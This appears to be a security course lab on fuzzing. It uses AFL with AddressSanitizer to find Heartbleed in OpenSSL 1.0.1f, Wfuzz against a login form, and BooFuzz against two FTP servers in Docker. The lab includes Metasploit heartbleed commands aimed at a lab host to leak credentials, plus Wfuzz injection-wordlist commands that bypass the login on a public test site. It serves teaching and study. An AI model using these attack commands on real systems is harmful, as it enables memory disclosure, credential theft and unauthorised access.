description: This lab includes various tool to experiment the fuzzing.
goal:
The goal of this lab is to understand the use of the most known tools to fuzz. In details, the laboratory includes three sections:

  • The first deals with the use of American Fuzzing Loop (AFL) with a specific target: OpenSSL (version 1.0.1f).

  • The second deals with the use of Wfuzz: the Web Fuzzer.

  • The third deals with the use of BooFuzz to fuzz two FTP servers.

Below is a brief description of the tools.

American Fuzzing Lop

American Fuzzy Lop is a well-known file fuzzer. It submits semi-valid files to applications that consume audio files, video files, word processing (or in general, any text/binary file that an
application might parse). It is a security-oriented fuzzer that employs a novel type of compile-time instrumentation and genetic algorithms to automatically discover clean, interesting test cases that trigger new internal states in the targeted binary.

Why is AFL different from other tools?
Often, network protocols and formats require certain key strings be present, but unexpected combinations with attack heuristics cause the data parsing functions to die.
On the contrary, genetic algorithms, used by AFL, try and retry many permutations of valid command orderings, with varying data and mutations.
Below is an image of the operations performed by AFL:

Numerous bugs have been detected by AFL, among which one of the most famous is Heartbleed.
Heartbleed was introduced in OpenSSL 1.0.1 and it is a read buffer overflow. What that means is that an application is reading outside the boundaries of a buffer.
For example, imagine an application has a space in memory that's 10 bytes long. If the software tries to read 20 bytes from that buffer, you have a read buffer overflow. It will read whatever is in the memory located after the 10 bytes.
When buffer overflows happen an application doesn't always crash: that's also the case with Heartbleed.

There are a couple of technologies that improve the detection of memory access errors like buffer overflows.
One of these is Address Sanitizer. Address Sanitizer is part of the C compiler and has been included into the two most common compilers in the free software world, gcc and llvm.
Why use ASAN? Because ASAN, a fast memory error detector, is part of the LLVM compiler infrastructure. It performs compile-time instrumentation and uses a runtime library that replaces memory management functions such as malloc and free with custom code. With these properties, while fuzzing with AFL, you increase the likelihood of finding memory corruption errors such as heap buffer overflow, memory leaks and others.

Wfuzz

Wfuzz has been created to facilitate the task in web applications assessments and it is based on a simple concept: it replaces any reference to the FUZZ keyword by the value of a given payload. This simple concept allows any input to be injected in any field of an HTTP request, allowing to perform complex web security attacks in different web application components such as: parameters, authentication, forms, directories/files, headers, etc.

In this lab, we'll use Wfuzz to discover and exploiting web application and vulnerabilities.

 BooFuzz

Boofuzz is a fork of and the successor to the venerable Sulley fuzzing framework.
Besides numerous bug fixes, boofuzz aims for extensibility and its goal is fuzz everything.
The possible targets which can be fuzzed with boofuzz are two :


1) HTTP Servers
2) FTP Servers.

In this case our aim is to fuzz a FTP Server.

As we know, the FTP protocol provides the possibility to handle data and, also if it is protected by user/password credential, it isn't however free from limitations and vulnerabilities.
One of this is the Anonymous login, a process that allows a user to login to a FTP Server anonymously, often by using "anonymous" as the username.
If anonymous login is allowed by admin to connect with ftp then anyone can login into server. An attacher can easly search for anonymous login permission using booFuzz or, for example, metasploit.
To secure his own FTP server from anonymous user login, the admin has to set the variable ANONYMOUS_ENABLE=NO in the .config file.
The result of fuzzing are avaible in live time and after the running's end.
The user will can view the result connecting to 'localhost:26000' in his broswer and at the end of running through SQLite Database Broswer opening a file from boofuzz-result folder which is generated automatically by the script.
solution:
American Fuzzing Lop

Inside the "afl_client" folder there are all the files needed to perform the fuzzing.
The "handshake.cc" file simulates a TLS handshake, while the "openssl" directory contains the version of OpenSSL 1.0.1f,  the last version that was vulnerable to Heartbleed.

First of all, compile OpenSSL with ASAN and AFL: in the "openssl" dir, use the command:

  CC=afl-clang-fast CXX=afl-clang-fast++ ./config -d

  AFL_USE_ASAN=1 make

After having compiled OpenSSL 1.0.1f, use the afl-clang-fast++ to compile the test application (handshake.cc) :

AFL_USE_ASAN=1 afl-clang-fast++ -g handshake.cc openssl/libssl.a openssl/libcrypto.a -o handshake -I openssl/include -ld

The handshake.cc program is a simple SSL-based server using the OpenSSL-1.0.1f version. The code is visible with the command:

more handshake.cc

Now  run afl with handshake as target:

AFL_SKIP_CPUFREQ=1 afl-fuzz -i in -o output -m none -- ./handshake

With this command you are fuzzing the handshake binary file with the input in the "in" folder (a simple string "AAA"), while the result will be present in the "output" folder.

The fuzzing process will continue until you press Ctrl-C. At minimum, you want to allow the fuzzer to complete one queue cycle, which may take anywhere from a couple of hours to a week or so.

There are three subdirectories created within the output directory and updated in real time:

  • queue/ - test cases for every distinctive execution path, plus all the starting files given by the user.

  • crashes/ - unique test cases that cause the tested program to receive a fatal signal (e.g., SIGSEGV, SIGILL, SIGABRT). The entries are grouped by the received signal.

  • hangs/ - unique test cases that cause the tested program to time out.

Inside the "crashes" folder you can view the numerous crashes identified in a similar way:

  • id: xxxxxx - sequential number of a unique-looking crash;
  • sig: 06 - the crashing signal (SIGABRT in this case; another common signal is 11, SIGSEGV);
  • src:nnnnnn' - refers to the ID of the test case used as the input. This test case was mutated in some way to derive the one you're looking at.
  • op:havoc,rep:32' - the operation that transformed the source file into this crashing case. This actually isn't a very descriptive one, it just means 32 rounds of stacked random tweaks.

To verify that a buffer overflow has occurred with fuzzing process, use GDB, short for GNU Debugger, the most popular debugger for UNIX systems to debug C and C++ programs.
Inside "crashes" folder, make sure you can reproduce one of these crashes by opening the fuzzed binary again in GDB and piping the crash file as input to the run command:

cd /home/afl_client/output/crashes
gdb -q ../../handshake

and then examine the crash with:

r < "name_of_crashes"

This successfully reproduces the crash.

To check the function that caused the crash, you need to check the memory address 0x4d9b71:

To do this, enter the following command:

info symbol 0x4d9b71.

the result is the following:

As you can see, the function that caused this crash is memcopy!

Now, you have to understand what is the function that called memcopy: to do this, you must have information on the memory address 0x526396:

This function is called in the file /home/afl_client/openssl/ssl/t1_lib.c.

Let's analyze the code.

First of all, at the line 2556 is initialized a pointer to the data of an SSLv3 record assigned to p.
The Ssl Record structure is made up of:

Now, as you can see in the code, the first byte of the SSL record is the type of heartbeat received (REQUEST or RESPONSE), and the macro n2s(p, payload) just takes two bytes from p, and puts them in payload.
The payload will contain the length specified by the client in the Payload Lenght field.

The variable pl now points to the heartbeat data, which was sent by the client. The important thing to notice here is that the length in the SSL record is not checked/verified. The fact that the SSL record length was not checked is a big deal, since later in the same function, memory is allocated using that same payload length, shown in the code below:

In this step, the required amount of memory is allocated as response for the client with the OPENSSL_malloc function: 1 byte (type filed) + 2 byes (payload length field) + payload (max size 65535 bytes) + padding.

The variable bp is the pointer used to access this memory.

After, s2n(payload, bp) moves the payload size to the bp buffer, and memcpy copies payload number of bytes from pl (pointer to heartbeat data) to bp (pointer to allocated memory for the response).

In a classic scenario, pl and bp should be the same size, except for the first 3 byte of the header.
What if pl is only a few bytes large? Or even just one byte?
An attacker could have told us the payload was 64kb, when it was only 1 byte. In the memcpy function we will copy a buffer of 1 byte size into a buffer of 64kb and consequently the remaining 63kb will be extracted from the memory in that moment.
What is the problem?
There is potentially a lot of sensitive data in the surrounding memory, like usernames, passwords, and even private keys.

Now that you've seen how heartbleed can be identified using fuzzing, let's see how this vulnerability can be exploited.

Use as target the server "ServerHTTPS" which has installed a version of openssl1.0.1f and Metasploit as tool attack. So, start the metasploit shell and run the command:

search heartbleed

Select the first one with the command:

use auxiliary/scanner/ssl/openssl_heartbleed

This will load the heartbleed module.

Now set the options, especially RHOSTS and verbose mode So:

set RHOSTS 193.20.3.3
set verbose true

Now, with the command run start the exploit!
Run the command a few times if the credentials are not leaked by heartbleed:

Connect to the link https://193.20.3.3 and try to use these credentials!

Wfuzz

The common use of Wfuzz is through command line. To realize the fuzzing, a wordlist suggested by Wfuzz himself was used, accessible at the following path: "/ home / wfuzz / wordlist / Injections". Below is a short part of the wordlist, which contains strings relating to known vulnerabilities

 

This site was used as the target that provides web pages with vulnerabilities: http://testphp.vulnweb.com

The vulnerable php page is at the following address: http://testphp.vulnweb.com/userinfo.php

The key step will be to fuzz the fields that interest us, that are username and password. To identify these fields, the attacker must identify the parameters that are passed in the POST request following login. To this purpose, use the "Inspect Element" tool and in the "Network" section look at the POST fields of the "Params" section:

 

 

After identifying the pass and uname fields, you can use Wfuzz to create an ad-hoc HTTP package for this specific scenario:

wfuzz -c -z file,/home/wfuzz/wordlist/Injections/All_attack.txt -d "uname=FUZZ&pass=FUZZ" http://testphp.vulnweb.com/userinfo.php

where the "FUZZ" value will be replaced by the strings inside the wordlist.

Following the fuzzing operation, the following output will be shown:

 

 

Some requests result 302, others 200.

These are the requests we are going to consider: by entering the payload associated with that request in the HTML form, you can log in.

In conclusion, Wfuzz is a very powerful tool, giving the possibility to use numerous types of wordlists or simply to fuzz only certain parameters, such as:

wfuzz -c -z file,/home/wfuzz/wordlist/Injections/All_attack.txt -d "uname=FUZZ&pass=" http://testphp.vulnweb.com/userinfo.php

 BooFuzz

The first step you have to do in order to complete this section is putting in execution the FTP servers that you will fuzz. To do this you have to launch the comands
1) docker run -p 21:21 23a5ef [to putting in execution jbenninghoff/vsftp]
2) docker run -p 8001:8001 7cde8a [to putting in execution metabrainz/docker-anon-ftp]

Now you have two FTP servers active on the ports 21 and 8001, to fuzz them you have to execute two python scripts that we named FuzzJB.py and FuzzME.py.
Before execute them, it's important take a look of script's lines of code.

The core  of th script is the session object

session = Session(
    target=Target(
        connection=TCPSocketConnection("127.0.0.1", 8021)))

When you create it, you’ll pass it a Target object, which will itself receive a Connection object where you will put the IP Address and the port of you fuzzing target.

With a Session object ready, you next need to define the messages in your protocol.
The protocol consists of some static function which are used in boofuzz to assemble messages for a protocol definition.
Keep in mind that every message protocol starts with the S_INITIALIZE() function.

In our case we have four message protocol:

s_initialize("user")    
s_string("USER")
s_delim(" ")
s_string("anonymous")
s_static("\r\n")

s_initialize("pass")
s_string("PASS")
s_delim(" ")
s_string("james")
s_static("\r\n")

s_initialize("stor")
s_string("STOR")
s_delim(" ")
s_string("AAAA")
s_static("\r\n")

s_initialize("retr")
s_string("RETR")
s_delim(" ")
s_string("AAAA")
s_static("\r\n")

The first message is necessary because USER is a command of FTP protocol that allows the script to specify/try the username.
The second message is necessary because PASS is a command of FTP protocol that allows the script to specify/try the password.
The third message is necessary because STOR is a command of FTP protocol that allows the script to store data on server.
The fourth message is necessary because RETR is a command of FTP protocol that allows the script to retrieve data from server.

In this case we will try to login into servers setting user as ANONYMOUS and password as JAMES; and then we try to store the string "AAAA" and then we will try to retrieve it.

After we take a look to the scripts, you can execute them running the comands python3 FuzzJB.py and python3 FuzzME.py from a shell.

The fuzz process in some cases will stop immediatly because the FTP server crashes and can't restart his service and in other cases the process will be very long and the script can
try to access to FTP server and store/retrieve some data.

In this, after you have launch FuzzJB.py script, you will see that JBENNINGHOFF/VSFTP would crash immediatly while METABRAINZ/DOCKER-ANON-FTP will never crash.
To see the progress of fuzzing process in real time you can open your broswer and digit localhost:26000 , otherwise you have to wait 10/15 minutes circa and the open SQLite Database broswer
with the code ->inserire comando per eseguire SQLite database <-.
Once you have started SQLite Database you have to load the result of fuzz process which are been saved in the folder boofuzz-result.
To do this you have to click on "Open Database" button and then select the file from the folder I have talked before. Once the archive was loaded you must select "steps" in scrollbar.
